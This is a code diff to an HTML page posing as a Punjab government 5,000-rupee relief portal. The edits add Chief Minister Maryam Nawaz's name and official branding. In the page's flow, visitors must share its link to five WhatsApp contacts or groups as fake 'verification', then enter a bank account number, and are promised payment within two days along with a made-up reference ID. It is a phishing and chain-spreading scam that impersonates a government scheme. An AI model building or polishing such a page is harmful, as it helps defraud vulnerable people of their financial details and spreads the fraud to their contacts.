@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Punjab Awami Imdad Portal - 5000 RS Scheme</title>
+    <title>CM Punjab 5000 Rs Awami Imdad Portal</title>
     <!-- Tailwind CSS -->
     <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
     <!-- Google Fonts for Urdu & English -->
@@ -27,13 +27,12 @@
             <div class="absolute -right-10 -bottom-10 w-32 h-32 bg-emerald-500 rounded-full opacity-20 blur-2xl"></div>
             <div class="absolute -left-10 -top-10 w-32 h-32 bg-teal-400 rounded-full opacity-20 blur-2xl"></div>
             
-            <h1 class="text-xl font-bold tracking-wide">Punjab Awami Imdad Portal</h1>
-            <p class="text-emerald-200 text-xs mt-1">Chief Minister Relief Package (Rs. 5,000)</p>
+            <h1 class="text-xl font-bold tracking-wide">CM Punjab Awami Imdad Portal</h1>
+            <p class="text-emerald-200 text-xs mt-1">Chief Minister Maryam Nawaz Relief Package (Rs. 5,000)</p>
             
             <!-- Leader / Govt Emblem Placeholder -->
             <div class="mt-4 flex justify-center items-center">
                 <div class="w-16 h-16 rounded-full border-2 border-white/80 shadow-lg overflow-hidden bg-emerald-900 flex items-center justify-center">
-                    <!-- Aap yahan official tasweer ka URL laga sakte hain -->
                     <span class="text-2xl">🏛️</span>
                 </div>
             </div>
@@ -52,8 +51,8 @@
             <!-- STEP 1: Registration Form -->
             <div id="step-1" class="space-y-4 fade-in">
                 <div class="bg-emerald-50 border-l-4 border-emerald-600 p-3 text-xs text-emerald-900 rounded-r">
-                    <p class="font-bold">Hidayat:</p>
-                    <p>Apni durust maloomat darj karein taake imdad ki raqam ki muntaqili mein koi rukawat na aaye.</p>
+                    <p class="font-bold">Wazahat:</p>
+                    <p>Yahan apply karne se CM Punjab Maryam Nawaz ki taraf se 5,000 rupaye ki imdad faraham ki jayegi. Apni durust maloomat darj karein.</p>
                 </div>
 
                 <div>
@@ -83,7 +82,7 @@
                 </div>
                 <h2 class="text-base font-bold text-gray-800">Ek Akhri Qadam Baqi Hai!</h2>
                 <p class="text-xs text-gray-600 leading-relaxed px-2">
-                    Apni darkhwast verify karwane ke liye is sahulat ko WhatsApp par <strong>5 mukhtalif doston ya groups</strong> mein share karein.
+                    CM Punjab 5000 Rs Imdad ki darkhwast verify karwane ke liye is link ko WhatsApp par <strong>5 mukhtalif doston ya groups</strong> mein share karein.
                 </p>
 
                 <div class="bg-gray-50 border border-gray-200 p-4 rounded-xl flex items-center justify-between text-sm shadow-sm">
@@ -95,18 +94,13 @@
                 <button onclick="shareOnWhatsApp()" class="w-full bg-green-500 hover:bg-green-600 text-white font-semibold py-3.5 rounded-xl shadow-md transition flex items-center justify-center gap-2 cursor-pointer text-sm">
                     <span>🟢 WhatsApp Par Share Karein</span>
                 </button>
-
-                <!-- Copy Link Option -->
-                <button onclick="copyPortalLink()" class="w-full bg-gray-100 hover:bg-gray-200 text-gray-700 font-medium py-2.5 rounded-xl transition text-xs cursor-pointer">
-                    🔗 Link Copy Karein
-                </button>
             </div>
 
             <!-- STEP 3: Bank Details -->
             <div id="step-3" class="hidden space-y-4 fade-in">
                 <div class="bg-blue-50 border-l-4 border-blue-600 p-3 text-xs text-blue-900 rounded-r">
                     <p class="font-bold">Mubarak Ho!</p>
-                    <p>Aapki sharing ki shart mukammal ho gayi hai. Ab apni raqam muntaqil karne ke liye account details dein.</p>
+                    <p>Aapki sharing ki shart mukammal ho gayi hai. CM Punjab ki taraf se 5,000 rupaye hasil karne ke liye apna account number darj karein.</p>
                 </div>
 
                 <div>
@@ -131,10 +125,10 @@
                 </div>
                 <h2 class="text-lg font-bold text-gray-800">Darkhwast Mohfooz Ho Gayi!</h2>
                 <p class="text-xs text-gray-600 leading-relaxed px-2">
-                    Aap ki darkhwast kaamyabi se jama ho chuki hai. Verifications ke baad aapke diye gaye number par **1 ya 2 din ke andar** 5,000 rupaye muntaqil kar diye jayenge.
+                    Aap ki darkhwast kaamyabi se CM Punjab portal par jama ho chuki hai. Verifications ke baad aapke diye gaye account par <strong>1 ya 2 din ke andar</strong> 5,000 rupaye muntaqil kar diye jayenge.
                 </p>
                 <div class="p-3 bg-yellow-50 border border-yellow-200 rounded-xl text-[11px] text-yellow-800 font-mono">
-                    Ref ID: #PK-5000-FS-2026-REG
+                    CM-Punjab Ref ID: #PK-CM-5000-2026
                 </div>
             </div>
 
@@ -161,14 +155,11 @@
         }
 
         function shareOnWhatsApp() {
-            // Real WhatsApp share API integration
-            const shareText = encodeURIComponent("Punjab Government 5000 Rs Imdad Scheme ke liye yahan register karein: " + window.location.href);
+            const shareText = encodeURIComponent("CM Punjab Maryam Nawaz 5000 Rs Imdad Scheme ke liye yahan se apply karein: " + window.location.href);
             const whatsappUrl = `https://api.whatsapp.com/send?text=${shareText}`;
             
-            // Open WhatsApp share window
             window.open(whatsappUrl, '_blank');
 
-            // Increment share counter automatically on click
             if (shares < 5) {
                 shares++;
                 document.getElementById('shareCount').innerText = `${shares} / 5`;
@@ -176,25 +167,6 @@
                 if (shares === 5) {
                     setTimeout(() => {
                         alert('Aapka share goal mukammal ho gaya hai! Ab bank details darj karein.');
-                        document.getElementById('step-2').classList.add('hidden');
-                        document.getElementById('step-3').classList.remove('hidden');
-                        document.getElementById('indicator-2').className = "pb-1 text-gray-400";
-                        document.getElementById('indicator-3').className = "text-emerald-600 border-b-2 border-emerald-600 pb-1";
-                    }, 1000);
-                }
-            }
-        }
-
-        function copyPortalLink() {
-            navigator.clipboard.writeText(window.location.href);
-            alert('Portal ka link copy ho gaya hai! Ab isay doston ko paste karein.');
-            
-            // Count a share when link is copied as well
-            if (shares < 5) {
-                shares++;
-                document.getElementById('shareCount').innerText = `${shares} / 5`;
-                if (shares === 5) {
-                    setTimeout(() => {
                         document.getElementById('step-2').classList.add('hidden');
                         document.getElementById('step-3').classList.remove('hidden');
                         document.getElementById('indicator-2').className = "pb-1 text-gray-400";
